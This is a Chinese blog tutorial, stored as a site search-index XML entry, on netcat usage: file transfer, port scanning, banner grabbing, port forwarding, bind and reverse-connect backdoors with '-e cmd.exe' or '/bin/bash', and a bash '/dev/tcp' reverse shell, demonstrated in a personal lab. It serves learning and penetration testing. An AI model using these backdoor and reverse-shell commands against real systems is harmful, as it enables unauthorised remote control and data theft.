<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>netcat的简单使用</title>
    <url>/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h1 id="关于netcat的简单使用报告"><a href="#关于netcat的简单使用报告" class="headerlink" title="关于netcat的简单使用报告"></a>关于netcat的简单使用报告</h1><h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.背景介绍"></a>1.背景介绍</h2><p> 在网络工具中，具有“瑞士军刀”美誉的net cat。是一个简单易用的基于tcp/ip协议（c/s模型）的“瑞士军刀”。</p><h2 id="2-使用范围"><a href="#2-使用范围" class="headerlink" title="2.使用范围"></a>2.使用范围</h2><p>针对功能强大的的netcat展开，我将以图文的方式讲解netcat基本使用、命令参数、文件传输、建立后门、端口转发、实现内外网突破。</p><a id="more"></a>

<h2 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3.使用场景"></a>3.使用场景</h2><p>客户端连接防火墙被拒绝，但防火墙的过滤机制并不能过滤服务器外联产生的流量，此时将会于客户端连接,装备nc的客户端将会成为nc的服务端，而连接的服务端就成为了nc的客户端，达到突破网络限制的目的。</p>
<h2 id="4-具体使用"><a href="#4-具体使用" class="headerlink" title="4.具体使用"></a>4.具体使用</h2><h3 id="1-基础使用方法"><a href="#1-基础使用方法" class="headerlink" title="1.基础使用方法"></a>1.基础使用方法</h3><h4 id="（1）创建一个服务器端方法"><a href="#（1）创建一个服务器端方法" class="headerlink" title="（1）创建一个服务器端方法"></a>（1）创建一个服务器端方法</h4><p><code>nc -l -p [localport]</code></p>
<h4 id="2-创建一个客户端方法（连接服务端）"><a href="#2-创建一个客户端方法（连接服务端）" class="headerlink" title="(2)   创建一个客户端方法（连接服务端）"></a>(2)   创建一个客户端方法（连接服务端）</h4><p><code>-nc [remote_addr] [remoteport]</code></p>
<h4 id="（3）实例演示1"><a href="#（3）实例演示1" class="headerlink" title="（3）实例演示1"></a>（3）实例演示1</h4><p>通过这样一个过程，仅实现一个简单的通信系统，并不能对机器进行命令执行。下图为实例，我在Windows系统下创建一个服务器端</p>
<p>并在kali中创建一个客户端，使用nc的方式进行连接，完成了基本</p>
<p>的对话。</p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.png" alt="基础使用"></p>
<h4 id="（4）返回shell的使用方法"><a href="#（4）返回shell的使用方法" class="headerlink" title="（4）返回shell的使用方法"></a>（4）返回shell的使用方法</h4><p><strong>1.创建一个服务器端的方法：</strong></p>
<p><code>nc -l -p [localport] -e cmd.exe</code></p>
<p>注释：这里-e的意义是连接之后要返回给连接端对应的程序。</p>
<p><strong>2.创建一个客户端方法（连接服务端）</strong></p>
<p><code>nc  [remote_addr]   [remoteport]</code></p>
<h4 id="5-实例演示2"><a href="#5-实例演示2" class="headerlink" title="(5)  实例演示2"></a>(5)  实例演示2</h4><p>windows下创建一个服务端，并用kali连接即可获得windows的命令行。。。我用来查看了Windows系统下的ip地址和桌面文件，这是相当可怕的。其中的乱码应该是ut)f-8码。</p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E5%8F%8D%E5%BC%B9shell1.png" alt="反弹shell1"></p>
<h3 id="2-文件传输"><a href="#2-文件传输" class="headerlink" title="2.文件传输"></a>2.文件传输</h3><h4 id="（1）使用场景"><a href="#（1）使用场景" class="headerlink" title="（1）使用场景"></a>（1）使用场景</h4><p><strong>1.取证</strong></p>
<p>当目标被黑客攻击后，取证人员可以利用nc的文件传输功能来获取目标机器上的文件内容。避免直接在目标机器上进行操作造成取证的误差。</p>
<p><strong>2.单纯获取目标机器敏感文件</strong></p>
<p>当目标机器上有一些文件内容，无法正常下载是，可以利用nc进行文件传输。</p>
<p><strong>注释</strong>：nc中的数据传输，使用的是标准输入输出流。所以可以直接用命令行进行操作。</p>
<h4 id="（2）-文件传输使用方法"><a href="#（2）-文件传输使用方法" class="headerlink" title="（2） 文件传输使用方法"></a>（2） 文件传输使用方法</h4><p><strong>1.创建一个服务器端方法</strong></p>
<p><code>nc -l -p [localport] &gt; outfile</code></p>
<p>注释：这里outfile表示接收文件</p>
<p><strong>2.创建一个客户端方法（连接服务端）</strong></p>
<p>-nc   [remote_addr]    [remoteport]   &lt; infile</p>
<h4 id="3-实例演示"><a href="#3-实例演示" class="headerlink" title="(3)  实例演示"></a>(3)  实例演示</h4><p>提前建立好一个内容为hudhaiuh的flag.txt文件，并用两个终端分别模拟客户端与服务端，传输成功！</p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.png" alt="文件传输"></p>
<!--*****这里不仅仅局限于客户端向服务端发送文件，服务器端建立端口随时向连接的客户端发送文件也是类似的方法，不再赘述。*-->

<h4 id="（4）文件传输遇到的问题"><a href="#（4）文件传输遇到的问题" class="headerlink" title="（4）文件传输遇到的问题"></a>（4）文件传输遇到的问题</h4><p>如果此时服务端并没有准备好连接，而客户端已经使用nc进行连接，那么客户端会一直等待下去，直到连接上服务端，造成一种nc“假死”的状态。</p>
<h4 id="（5）解决方法"><a href="#（5）解决方法" class="headerlink" title="（5）解决方法"></a>（5）解决方法</h4><p>可以设置等待时间。</p>
<p><code>nc    w3  [ip]    [port]</code>    w3的意思是设置3秒的等待时间，超过三秒钟，客户端直接关闭等待连接，，，，感受到了这个程序的温暖。</p>
<h3 id="3-信息探测"><a href="#3-信息探测" class="headerlink" title="3.信息探测"></a>3.信息探测</h3><h4 id="（1）使用场景-1"><a href="#（1）使用场景-1" class="headerlink" title="（1）使用场景"></a>（1）使用场景</h4><p><strong>1.目标内网的扫描</strong></p>
<p>当获得目标权限侯，如果目标没有任何途径可以对内网进行探测，二此时刚好具有一个netcat的话，就可以使用netcat进行内网IP和端口的扫描。</p>
<p><strong>2.单纯对某个目标进行端口探测</strong></p>
<p>当手头没有任何探测工具时。。。</p>
<p><strong>3.对目标服务的服务banner进行抓取</strong></p>
<p>当你需要抓取banner时。搞渗透嘛，当然信息越多越好。</p>
<p><strong>注释</strong>：banner信息表示欢迎语，其中会包含一些敏感信息，所以获取banner也属于信息搜集的范畴。在渗透测试中，典型的4xx,5xx信息泄露就属于banner泄露的一种。在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等。而版本号有时候就会存在于公开的CVE问题，可以直接利用。</p>
<h4 id="（2）端口扫描使用方法"><a href="#（2）端口扫描使用方法" class="headerlink" title="（2）端口扫描使用方法"></a>（2）端口扫描使用方法</h4><p><code>nc -v -n -z -w1 [target_ip] [start_port-stop_port]</code></p>
<p><strong>注释：</strong>-v  表示对错误进行详细输出</p>
<p>​           -n   不对目标进行DNS解析</p>
<p>​           -z    zero   I/O  模式，专用于端口扫描。表示对目标ip发送的<strong>数据表</strong>中不包含任何的payload,这样做可以加快扫描的速度。</p>
<h4 id="（3）实例演示1-1"><a href="#（3）实例演示1-1" class="headerlink" title="（3）实例演示1"></a>（3）实例演示1</h4><p> 先查看该虚拟机的IP地址，然后分别扫描1-1000，1-65535  端口，速度非常之快，如图    </p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="端口扫描"></p>
<h4 id="（4）Banner抓取使用方法"><a href="#（4）Banner抓取使用方法" class="headerlink" title="（4）Banner抓取使用方法"></a>（4）Banner抓取使用方法</h4><p><code>echo  &quot; &quot;  |  nc -v -n -w1 [target_ip]  [start_port-stop_port]</code></p>
<h4 id="5-实例演示2-1"><a href="#5-实例演示2-1" class="headerlink" title="(5)   实例演示2"></a>(5)   实例演示2</h4><p>写到这里蜜汁尴尬，开放的端口里并没有banner信息。。。无妨。你相信有就有。</p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E8%8E%B7%E5%8F%96banner.png" alt="获取banner"></p>
<h3 id="4-建立后门"><a href="#4-建立后门" class="headerlink" title="4.建立后门"></a>4.建立后门</h3><h4 id="（1）使用场景-2"><a href="#（1）使用场景-2" class="headerlink" title="（1）使用场景"></a>（1）使用场景</h4><p>1.获取目标的命令执行权限</p>
<p>当目标机器上存在netcat之后，可以使用netcat建立后门，来实现执行目标命令的功能。原理：标准输入输出流，</p>
<h4 id="（2）Windows建立后门使用方法"><a href="#（2）Windows建立后门使用方法" class="headerlink" title="（2）Windows建立后门使用方法"></a>（2）Windows建立后门使用方法</h4><p><strong>1.监听型后门</strong></p>
<p><code>nc -l -p 4444 -e cmd.exe</code></p>
<p>用来监听4444端口。这是表示客户端监听了服务端的4444，如果被黑客利用，则后果不堪设想。</p>
<p><strong>2.连接型后门</strong></p>
<p><code>nc [remote_ip] [remote_port] -e cmd.exe</code></p>
<p>连接型后门表示服务端通过连接客户端以获得客户端的命令行。</p>
<h4 id="（3）实例演示"><a href="#（3）实例演示" class="headerlink" title="（3）实例演示"></a>（3）实例演示</h4><p>我只是简单的用kali创建了一个服务端，用windows一连接命令行就被获取。</p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E7%9B%91%E5%90%AC%E5%9E%8B%E5%90%8E%E9%97%A8.png" alt="监听型后门"></p>
<p>当然，无论是哪种后门，都需要使用-额cmd.exe 来返回对应的cmd.exe.</p>
<h4 id="（4）linux下建立后门使用方法"><a href="#（4）linux下建立后门使用方法" class="headerlink" title="（4）linux下建立后门使用方法"></a>（4）linux下建立后门使用方法</h4><p><strong>1.监听型后门</strong></p>
<p><code>nc  -l  -p  port  -e  /bin/bash</code></p>
<p><strong>2.连接型后门</strong></p>
<p><code>nc  -[remote_ip]  [remote_port]  -e  /bin/bash</code></p>
<p><strong>注释：</strong>理论与方法均与Windows系统下一样，只是命令有细微区别，这里不做实例。</p>
<h3 id="5-连接转发"><a href="#5-连接转发" class="headerlink" title="5.连接转发"></a>5.连接转发</h3><h4 id="（1）简单介绍"><a href="#（1）简单介绍" class="headerlink" title="（1）简单介绍"></a>（1）简单介绍</h4><p>  在内网渗透相关的文章中经常会听到“端口转发”这个名词，但并不太确定具体是什么，现在看来和NAT、端口映射是一个意思。</p>
<p>更具体而言，端口转发程序用于跳板机器上，可解决攻击机与目标机网络不通的问题；端口转发程序用于目标机上，可以解决攻击机与目标机网络通但具体服务端口被目标机防火墙限制的问题。</p>
<p>客户端&lt;—-&gt;转发程序&lt;—-&gt;目标服务（&lt;—-&gt;表示网络连接）</p>
<h4 id="（2）使用场景"><a href="#（2）使用场景" class="headerlink" title="（2）使用场景"></a>（2）使用场景</h4><p>有时候我们需要突破某些特殊情况下的连接限制，以及处理一些特殊情况。</p>
<h4 id="（3）连接转发的使用方法"><a href="#（3）连接转发的使用方法" class="headerlink" title="（3）连接转发的使用方法"></a>（3）连接转发的使用方法</h4><p><code>echo nc [target] [port] &gt; delay.bat</code></p>
<p><code>echo nc [localport] -e delay.bat</code></p>
<p>当有客户端连接该服务端时，连接的客户端通过服务端连接到target  port上，实现了连接转发功能。（端口转发）</p>
<p><strong>注释</strong>：delay.bat为windows下的批处理文件。</p>
<h4 id="（4）实例演示"><a href="#（4）实例演示" class="headerlink" title="（4）实例演示"></a>（4）实例演示</h4><p>我将用windows系统下的pc作为客户端，同一网段的kalilinux会以服务端1的身份与之连接，然后达到与服务端2，另一台外网上kaliLinux连接的目的。</p>
<p>因另一台外网虚拟机出了点问题没有截图，实例以后补上。。。</p>
<h3 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h3><h4 id="1-使用场景"><a href="#1-使用场景" class="headerlink" title="(1)使用场景"></a>(1)使用场景</h4><p>某些拿到服务器权限后，想要设置一个反弹shell。但是目标服务器上没有装netcat时。</p>
<h4 id="（2）反弹shell的使用方法"><a href="#（2）反弹shell的使用方法" class="headerlink" title="（2）反弹shell的使用方法"></a>（2）反弹shell的使用方法</h4><p><strong>1.反弹shell的命令:</strong></p>
<p><code>bash  -i  &gt;&amp;  /dev/tcp/ip/port  0&gt;&amp;1</code></p>
<p><strong>2.PC接受net cat命令：</strong></p>
<p><code>nc -lvp port</code></p>
<p><strong>注释：</strong>bash  -i表示已交互运行bash shell.</p>
<p>​           文件描述符：0标准输入</p>
<p>​                                  1标准输出</p>
<p>​                                  2错误输入输出</p>
<p>​            那么命令中0&gt;&amp;1表示将标准输入重定向到标准输出。</p>
<h4 id="3-实例演示-1"><a href="#3-实例演示-1" class="headerlink" title="(3)实例演示"></a>(3)实例演示</h4><p>我使用Windows监听4444端口，假设我的kali linux没有安装nc(实际已安装，不过问题不大)，在kali上输入反弹的命令，很轻松拿到shell!</p>
<p><img src="/zswbs.coding.me/zswbs.coding.me/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p>
<p>此外还有python的方法反弹shell,当然前提是目标机上安装了python,对python还不是很了解，所以缺口待补。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>nc其实有许许多多的用法，这里只是使用了一部分，但我已经感受到了他的强大与可怕，无愧网络瑞士军刀。</p>
<p>车到山头必有路，没事多用用nc   -h，你会发现新大陆。完。</p>
<p>​                                                                                                                                                        —-扬州墨客</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具 网络瑞士军刀</tag>
      </tags>
  </entry>
</search>
